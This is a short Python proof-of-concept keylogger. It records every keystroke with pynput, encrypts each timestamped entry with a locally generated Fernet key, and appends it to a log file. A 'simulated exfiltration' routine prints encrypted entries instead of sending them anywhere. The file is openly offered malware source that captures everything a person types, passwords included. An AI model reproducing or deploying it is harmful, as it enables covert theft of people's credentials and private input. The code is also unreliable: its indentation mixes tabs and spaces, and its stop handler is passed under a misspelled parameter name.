#poc_keylogger.py
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import base64
import os
#Load encryption key 
KEY_PATH = "secret.key"
LOG_FILE =	"encrypted_log.txt"
#Load Fernet key


if not os.path.exists(KEY_PATH):
    key = Fernet.generate_key()
    with open(KEY_PATH, "wb") as f:
        f.write(key)
else:
    with open(KEY_PATH, "rb") as f:
        key = f.read()
		
fernet = Fernet(key)
#encrypt and save log
def save_encrypted_log(key_event):
	now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
	data = f"[{now}] {key_event}\n"
	encrypted = fernet.encrypt(data.encode())
	encoded = base64.b64encode(encrypted)

	with open(LOG_FILE,"ab") as f:
		f.write(encoded + b"\n")

#simulate sending logs to fake server
def simulate_send():
	print("\n--- Simulated Data Exfilteration to Server") 
	with open(LOG_FILE,"rb") as f:
		 lines = f.readlines()
		 for i, line in enumerate(lines[:5]): 
			 print(f"Encrypted Log{i+1}: {line.strip().decode()[:80]}")
	print ("-End of stimulation-\n") 
#key press Handler
def on_press(key):
	try:
		save_encrypted_log(key.char)
	except AttributeError:
		save_encrypted_log(str(key))
#kill switch-ESC key
def onrelease(key):
	if key==keyboard.Key.esc:
		simulate_send()
		return  False
print("[+] POC Keylogger is running. Press ESC to stop and simulate Exfilteration")
with keyboard.Listener(on_press = on_press, onrelease = onrelease) as listener:
	listener.join()
